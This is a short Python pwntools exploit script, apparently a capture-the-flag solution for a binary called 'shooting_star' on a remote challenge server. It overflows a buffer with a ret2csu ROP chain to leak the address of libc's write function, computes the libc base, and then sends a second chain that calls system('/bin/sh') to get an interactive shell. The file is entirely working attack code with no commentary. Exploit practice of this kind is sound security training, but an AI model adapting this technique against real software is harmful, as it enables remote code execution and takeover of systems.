from pwn import *

csu_gadget1 = 0x4012c2 # rbx rbp r12 r13 r14 r15
csu_gadget2 = 0x4012a8 # r14->rdx r13->rsi r12->edi call-r15 rbx++
pop_rdi = 0x4012cb

context.binary = exe = ELF('./shooting_star')
libc = ELF('./libc.so')

#io = process()
io = remote('142.93.32.153', 32151)

io.sendlineafter(b'> ', b'1')
payload = b'\0'*0x48
payload += p64(csu_gadget1) + p64(0) + p64(1) + p64(1) + p64(exe.got['write']) + p64(8) + p64(exe.got['write'])
payload += p64(csu_gadget2) + p64(0)*7
payload += p64(exe.sym['main'])
io.sendlineafter(b'>> ', payload)
io.recvuntil(b'true!\n')

libc.address = u64(io.recv(8)) - libc.sym['write']
log.info(f'Libc base: {hex(libc.address)}')

io.sendlineafter(b'> ', b'1')
payload = b'\0'*0x48
payload += p64(pop_rdi) + p64(next(libc.search(b'/bin/sh'))) + p64(pop_rdi+1) + p64(libc.sym['system'])
io.sendlineafter(b'>> ', payload)

io.interactive()